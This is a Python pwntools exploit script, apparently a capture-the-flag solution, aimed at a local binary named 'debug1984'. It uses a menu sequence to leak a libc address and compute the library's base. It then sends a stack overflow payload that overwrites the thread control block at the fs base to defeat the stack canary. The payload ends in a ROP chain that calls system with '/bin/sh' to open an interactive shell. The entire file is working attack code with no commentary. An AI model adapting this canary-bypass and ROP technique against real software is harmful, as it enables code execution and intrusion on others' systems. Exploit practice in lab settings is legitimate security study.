#!/usr/bin/env python

from pwn import *

def leaker(target):
    for i in range(1, 4):
        for n in range(0, 5):
            target.sendline(bytes(str(i), 'utf-8'))
            target.recvuntil(b'Name: ')
            target.sendline(b'a')
            target.recvuntil(b'[#] ')
        target.clean()
    for i in range(1, 3):
        for n in range(0, 5):
            target.sendline(b'5')
            target.recvuntil(b'choice: ')
            target.sendline(bytes(str(i), 'utf-8'))
            target.recvuntil(b'[#] ')
        target.clean()
    for i in range(0, 4):
        target.sendline(b'5')
        target.recvuntil(b'choice: ')
        target.sendline(b'3')
        target.recvuntil(b'[#] ')
    target.clean()
    target.sendline(b'5')
    target.recvuntil(b'choice: ')
    target.sendline(b'0'*0x500)
    target.recvuntil(b'[#] ')
    for i in range(0, 5):
        target.sendline(b'1')
        target.recvuntil(b'Name: ')
        target.sendline(b'a')
        target.recvuntil(b'[#] ')
    for i in range(0, 2):
        target.sendline(b'2')
        target.recvuntil(b'Name: ')
        target.sendline(b'a')
        target.recvuntil(b'[#] ')
    target.clean()
    target.sendline(b'3')
    target.recvuntil(b'Name: ')
    target.send(b'aaaaaaaa')
    target.recvuntil(b'[#]')
    target.sendline(b'5')
    target.recvuntil(b'choice: ')
    target.sendline(b'3')
    target.recvuntil(b'seen ')
    leak = u64(target.recvuntil(b'around')[8:-7].ljust(8, b'\x00'))
    return leak

def main():
    target = process("./sourceCode/debug1984", aslr = True)
    libc = ELF('./glibc/libc.so.6')
    input()
    libcOff = leaker(target)
    libc.address = libcOff - 0x1fac10
    libcBase = libc.address
    print("Leaked offset: {}".format(hex(libcOff)))
    print("Libc Base: {}".format(hex(libcBase)))

    input()

    target.sendline(b'6')
    target.recvuntil(b'?')
    #payload
    dummyCanary = b'a'*0x8
    fsBaseOff = 0x810
    writableAddr = libcBase + 0x1fa000
    fakeTCBStruct = p64(0x00) * 2 + p64(writableAddr) + p64(0x01) + p64(0x00) + dummyCanary

    poprdiret = libcBase + 0x2d8b5
    binshStr = libcBase + 0x1bd115
    system = libc.sym["system"]
    ropchain = p64(poprdiret) + p64(binshStr) + p64(system)

    payload = b'b'*0x18
    payload += dummyCanary
    payload += p64(0x00)
    payload += ropchain
    payload += b'a' * (fsBaseOff - len(payload)) + fakeTCBStruct

    target.sendline(payload)

    target.interactive()
    return 0

if __name__ == "__main__":
    main()
